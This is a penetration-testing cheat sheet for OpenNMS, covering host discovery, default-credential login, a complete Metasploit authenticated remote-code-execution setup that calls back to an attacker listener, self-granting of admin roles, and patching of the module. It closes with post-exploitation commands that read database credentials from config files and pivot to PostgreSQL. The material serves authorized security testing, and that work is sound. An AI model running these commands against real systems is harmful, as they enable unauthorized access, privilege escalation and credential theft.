# OpenNMS

OpenNMS Horizon / Meridian is a Java-based network monitoring platform. Admin access can lead to command execution through notification configuration and filesystem editor functionality.

## Discovery

```bash
curl -I http://TARGET/
curl -I http://TARGET/opennms/
```

Look for redirects to:

```text
/opennms/login.jsp
```

After login, the dashboard footer often discloses the version:

```text
Version: 30.x.x
```

## Default Credentials

OpenNMS commonly documents default web credentials. Try documented defaults only where allowed, then immediately check the current user's roles.

User roles are visible from the UI:

```text
Admin / Configure OpenNMS / Configure Users
```

Important roles for exploitation:

```text
ROLE_ADMIN
ROLE_REST
ROLE_FILESYSTEM_EDITOR
```

## Metasploit Authenticated RCE

```bash
msfconsole
use exploit/linux/http/opennms_horizon_authenticated_rce
set RHOSTS TARGET
set RPORT 80
set TARGETURI /opennms/
set VHOST VHOST_NAME
set USERNAME USER
set PASSWORD PASSWORD
set LHOST ATTACKER_IP
set LPORT ATTACKER_PORT
run
```

If the target is slow or proxied:

```text
set VERBOSE true
set HttpClientTimeout 30
set WfsDelay 30
```

If the fetch handler reports a resource collision, set a unique path:

```text
set FETCH_URIPATH /random-path
```

## Role Troubleshooting

Errors like this usually mean the authenticated user lacks filesystem or REST permissions:

```text
Unexpected response received while attempting to obtain the notificationCommands.xml file.
User may lack the required privileges.
```

If you can manage users, add the missing roles to the current user:

```text
ROLE_FILESYSTEM_EDITOR
ROLE_REST
```

Then rerun the module.

## Module Troubleshooting

Some versions of the Metasploit module may need the target arch adjusted. If the module authenticates and edits config but never gets a session, check current upstream issues and try changing the module metadata from command-arch to generic arch:

```ruby
# Change:
'Arch' => ARCH_CMD,

# To:
'Arch' => '',
```

Then restart Metasploit and rerun the module.

## Post-Exploitation

OpenNMS often runs in a container as the `opennms` user.

```bash
id
pwd
ls -la /usr/share/opennms
ls -la /.dockerenv
cat /proc/1/cgroup
```

Check datasource configuration for database credentials:

```bash
cat /usr/share/opennms/etc/opennms-datasources.xml
rg -i "jdbc|postgres|password|user-name" /usr/share/opennms/etc/
```

Example datasource fields to look for:

```xml
<jdbc-data-source name="opennms"
                  url="jdbc:postgresql://database:5432/opennms"
                  user-name="DB_USER"
                  password="DB_PASSWORD" />
```

If the database is in another container, use pivoting or port forwarding to reach it:

# Connect once reachable.
PGPASSWORD='DB_PASSWORD' psql -h DB_HOST -U DB_USER -d DB_NAME
```

See [Pentesting PostgreSQL](../recon-enumeration/pentesting-postgresql.md) for `COPY FROM PROGRAM` command execution.

